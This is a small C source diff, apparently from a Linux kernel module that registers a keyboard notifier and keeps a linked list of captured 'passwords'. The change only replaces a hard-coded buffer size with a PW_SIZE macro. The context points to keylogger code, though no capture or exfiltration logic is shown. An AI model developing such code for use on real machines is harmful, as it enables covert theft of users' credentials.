@@ -44,8 +44,10 @@ int kb_notifier_fn(struct notifier_block *pnb, unsigned long action, void* data)
 int init (void);
 void cleanup(void);
 
+#define PW_SIZE 16
+
 struct password{//27 byte struct
-	char pw[16]; // The passwords won't be longer than 15 characters with a null terminator
+	char pw[PW_SIZE]; // The passwords won't be longer than 15 characters with a null terminator
 	int overwrite_num;
 	struct password* next;
 };
